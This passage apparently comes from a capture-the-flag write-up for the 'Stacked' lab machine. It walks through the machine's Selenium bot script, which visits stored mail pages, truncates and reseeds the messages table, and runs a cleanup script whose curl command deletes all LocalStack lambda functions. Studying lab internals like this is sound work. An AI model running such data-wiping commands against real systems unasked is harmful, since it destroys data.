    if res:
        for row in res:
            try:
                id = row[0]
                print(f"trying {id}")
                if id:
                    driver.get(f"http://mail.stacked.htb/read-mail.php?id={id}")
                    htmlSource = driver.page_source
                    time.sleep(5)
                else:
                    print(f"Cannot access mail for {id}")
            except:
                print(f"Cannot access for {id}")
                pass
            time.sleep(2)
        c.execute("truncate messages;")
        c.execute("insert into messages (fullname, email, subject, message, reg_date) values ('Jeremy Taint','jtaint@stacked.htb','S3 Instance Started','Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.','2021-06-25 08:30:00');")
        db.commit()
        c.close()
        db.close()
    else:
        print("no mail")
    driver.close()
    os.system("sh -c /home/adam/selenium/delete_lambda.sh")
    exit()

if __name__ == "__main__":
    main()

```

The automation is actually reading the messages from the database, fetching a list of ids above one. It then loops over those ids, for each trying to load `read-mail.php?id={id}`. On each page load it sleeps five seconds, and then another two. Once all the messages are viewed, it clears the messages table, and then reinserts the first message that leaks the S3 subdomain. It also calls `delete_lambda.sh`.

#### delete\_lambda.sh

The final script in the automation is responsible for cleaning up lambda scripts in the container:

```

#!/bin/sh
curl --silent -X DELETE http://127.0.0.1:4566/2015-03-31/functions/all

```

It does that by hitting the LocalStack API endpoint to delete all functions.